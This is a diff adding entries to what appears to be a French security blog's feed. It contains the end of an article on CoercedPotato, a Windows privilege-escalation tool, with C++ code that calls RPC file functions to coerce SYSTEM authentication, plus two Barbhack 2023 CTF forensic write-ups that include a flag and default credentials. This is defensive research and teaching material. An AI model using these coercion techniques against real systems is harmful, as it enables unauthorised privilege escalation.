+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cerr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\[-\] An error has occurred during&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;NetrFileGetInfo() : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcEndExcept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous pourrions penser qu’il suffit de répéter l’exploit précédent en
+injectant notre payload dans &lt;strong&gt;ServerName&lt;/strong&gt;… Mais non ! La connexion sur
+le named pipe est effectuée par l’utilisateur qui a lancé l’outil, soit
+nous-mêmes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image22.png&quot; style=&quot;width:5.94024in;height:1.84105in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Page web, Icône d’ordinateur Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Exploiter cette fonction en indiquant un emplacement sur le réseau
+pourrait fonctionner pour provoquer une authentification sur le réseau,
+dans la mesure où c’est le compte machine qui prendrait le relai et
+effectuerait la connexion. &lt;strong&gt;Mais en local, c’est un « auto-pwn » !&lt;/strong&gt;  ☹&lt;/p&gt;
+
+&lt;p&gt;Pour finir l’illustration de nos propos, continuons maintenant avec la
+fonction &lt;strong&gt;NetrpGetFileSecurity()&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image23.png&quot; style=&quot;width:5.63841in;height:1.86533in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, blanc Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le code suivant a été utilisé :&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;c1&quot;&gt;// shareName doit correspondre à un partage réseau valide.&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;callNetrpGetFileSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;foo1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RequestedInformation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;OWNER&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GROUP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;DACL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PADT&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityDescriptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+  
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NetrpGetFileSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;RequestedInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;NetrpGetFileSecurity returned %lx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour utiliser cette fonction, il est nécessaire d’utiliser un partage
+réseau valide. Une erreur est renvoyée le cas contraire. Une fois cette
+condition remplie, il est effectivement possible de forcer l’exécution
+d’une requête par l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;. Petit bémol :
+le chemin indiqué correspond à un chemin de fichier absolu…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image24.png&quot; style=&quot;width:5.86999in;height:1.76867in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Page web, Icône d’ordinateur Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cette fonction ne peut donc pas être utilisée pour élever nos privilèges
+en local.&lt;/p&gt;
+
+&lt;p&gt;Pour résumer, la recherche de fonctions vulnérables pour une élévation
+de privilèges en local requiert finalement plus de prérequis que prévu.
+Certaines interfaces RPC sont exploitables pour de la coercition
+d’authentification sur le réseau, mais pas en local. Pour autant, nous
+continuons de chercher de nouvelles méthodes vulnérables ! &lt;/p&gt;
+
+&lt;p&gt;En revanche, les fonctions actuellement implémentées dans notre outil
+n’ont pas été patchées et ne seront certainement pas patchées, dans la
+mesure où leurs comportements sont considérés comme « légitimes » par
+Microsoft.&lt;/p&gt;
+
+&lt;p&gt;Vous retrouvez le code de l’outil ici :
+&lt;a href=&quot;https://github.com/hackvens/CoercedPotato&quot;&gt;&lt;span&gt;https://github.com/hackvens/CoercedPotato&lt;/span&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Notre PoC a été testé sur Windows 10, Windows Server 2016, Windows
+Server 2022 et Windows 11 ! 🥳&lt;/p&gt;
+
+&lt;p&gt;Et voilà, vous savez tout à propos de CoercedPotato !&lt;/p&gt;
+
+&lt;h1 id=&quot;remerciements&quot;&gt;&lt;strong&gt;Remerciements&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;Nous souhaiterions remercier toutes celles et ceux qui nous ont apporté
+leurs aides durant nos recherches et plus particulièrement :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Rémi GASCOU&lt;/strong&gt; (@Podalirius) pour ses travaux sur l’utilisation
+d’appels RPC et la création de l’outil Coercer.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Clément LABRO&lt;/strong&gt; (@itm4n) pour ses articles et recherches sur
+Printspoofer et Petitpotam.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Guillaume DAUMAS&lt;/strong&gt; (@BlackWasp) pour ses relectures et conseils.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Advens&lt;/strong&gt; pour l’organisation de la Hackvens ainsi que le temps
+alloué à nos recherches.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;🥔&lt;/p&gt;
+
+&lt;p&gt;Un article de &lt;em&gt;Raphaël HUON et Théo BERTRAND&lt;/em&gt;&lt;/p&gt;</content><author><name></name></author><category term="Articles" /><summary type="html">CoercedPotato - Une patate de plus ! 🥔</summary></entry><entry><title type="html">Discretfi</title><link href="http://localhost:4000/barbhack-2023/Discretfix.html" rel="alternate" type="text/html" title="Discretfi" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/Discretfix</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/Discretfix.html">&lt;h1 id=&quot;discretexfi&quot;&gt;Discretexfi&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Catégorie :&lt;/strong&gt; Forensic&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/enonce-discretexfi.png&quot; alt=&quot;enonce&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dans ce challenge nous récupérons un fichier pcap comportant des paquets réseaux capturé à un instant donné. Nous observons dans un premier temps du traffic TCP en grande quantité :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/wireshark-full.png&quot; alt=&quot;wireshark-full&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En filtrant sur les requêtes de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; nous restreignons l’affichage aux éléments qui nous intéresses. Pour ce faire nous utilisons le filtre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request.method==&quot;GET&quot;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/wireshark-filter.png&quot; alt=&quot;wireshark-filter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous notons la présence de 3 URL différents :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;/newfile?f=secret.txt&lt;/li&gt;
+  &lt;li&gt;/bit&lt;/li&gt;
+  &lt;li&gt;/lastbits&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cependant nous ne retrouvons pas d’élément faisant référence au flag que nous cherchons. La seul différence notable est la version d’HTTP utilisé qui change à chaque requête. Nous isolons puis convertissons cette information avec la commande suivante :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; Discretexfi.pcap &lt;span class=&quot;nt&quot;&gt;-Y&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http.request.method == &quot;GET&quot;&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print $10}&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;:a;N;$!ba;s/\n//g; s/ //g&apos;&lt;/span&gt; | perl &lt;span class=&quot;nt&quot;&gt;-lpe&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$_=pack&quot;B*&quot;,$_&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si nous décomposons cette commande nous obtenons :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tshark -r Discretexfi.pcap -Y &apos;http.request.method == &quot;GET&quot;&apos;&lt;/code&gt; permet d’extraire les informations du fichier de capture avec le filtre utilisé sur wireshark.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;122702  12.714845  192.168.0.2 → 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
+122712  12.715613  192.168.0.2 → 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
+122722  12.716368  192.168.0.2 → 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
+122732  12.717119  192.168.0.2 → 192.168.0.10 HTTP 217 GET /bit HTTP/1.0 
+122742  12.717882  192.168.0.2 → 192.168.0.10 HTTP 222 GET /lastbits HTTP/1.0&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awk -F &apos; &apos; &apos;{print $10}&apos;&lt;/code&gt; permet de n’extraire que le dernier champs, à savoir &lt;strong&gt;HTTP/1.1&lt;/strong&gt; ou &lt;strong&gt;HTTP/1.0&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;HTTP/1.1
+HTTP/1.1
+HTTP/1.1
+HTTP/1.0
+HTTP/1.0&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cut -d &apos;.&apos; -f 2&lt;/code&gt; permet de ne garder que le dernier chiffre de cette version, soit &lt;strong&gt;1&lt;/strong&gt; ou &lt;strong&gt;0&lt;/strong&gt;.&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;1
+1
+1
+0
+0&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sed &apos;:a;N;$!ba;s/\n//g; s/ //g&apos;&lt;/code&gt; permet de retirer les retours à la ligne&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;11100&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -lpe &apos;$_=pack&quot;B*&quot;,$_&apos;&lt;/code&gt; permet de convertir la suite binaire en ascii&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nous obtenons alors le résultat suivant :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ascii&quot;&gt;�0�9�6��4�2�9�22��2c�lices et des plaisirs gustatifs, se cache en moi une passion brûlante pour les bières. Derrière mon sourire et mes conversations animées, se trouve un amour profond et sincère pour cette boisson brassicole.
+La bière va bien au-delà d&apos;une simple boisson pour moi. C&apos;est une véritable expérience sensorielle, un voyage palpitant à travers les saveurs, les arômes et les textures. Chaque gorgée est une découverte, une exploration des possibilités infinies qu&apos;offre le monde brassicole.
+J&apos;adore me plonger dans la diversité des bières, partir à la recherche de nouvelles variétés, de brasseries artisanales et de créations audacieuses. Chaque bière est unique, racontant une histoire qui m&apos;envoûte et me transporte vers de nouveaux horizons gustatifs.
+brb{hTTp_vErSi0n_iS_th3_W44444y}
+La dégustation de bière est un art que je chéris. Je savoure chaque gorgée, laissant la bière se répandre sur ma langue et révéler ses secrets. Les saveurs se déploient avec grâce, les notes fruitées, épicées ou maltées dansent dans ma bouche, m&apos;invitant à explorer davantage.
+Mais ma passion pour les bières ne s&apos;arrête pas à la dégustation. Je suis captivé par l&apos;histoire et la culture brassicole, par les traditions et les techniques de brassage. Je m&apos;imprègne de chaque détail, chaque anecdote qui entoure cette boisson millénaire, nourrissant ma soif de connaissances brassif����\
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dans l’ensemble de ce texte nous retrouvons le flag : &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{hTTp_vErSi0n_iS_th3_W44444y}&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">Discretexfi</summary></entry><entry><title type="html">Rip My PXE</title><link href="http://localhost:4000/barbhack-2023/RipMyPXE.html" rel="alternate" type="text/html" title="Rip My PXE" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/RipMyPXE</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/RipMyPXE.html">&lt;h1 id=&quot;rip_my_pxe&quot;&gt;RIP_My_PXE&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Catégorie :&lt;/strong&gt; Forensic&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/enonce-rip-my-pxe.png&quot; alt=&quot;Enonce&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nous récupérons ici une machine virtuelle que nous importons dans virtualbox.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/upload-vm.png&quot; alt=&quot;upload-vm&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Après avoir démarré cette machine nous obtenons la mire d’authentification pour l’utilisateur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;  :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/user-ubuntu.png&quot; alt=&quot;Ubuntu user&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le mot de passe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; est valide et nous permet de déverrouiller la session.&lt;/p&gt;
+
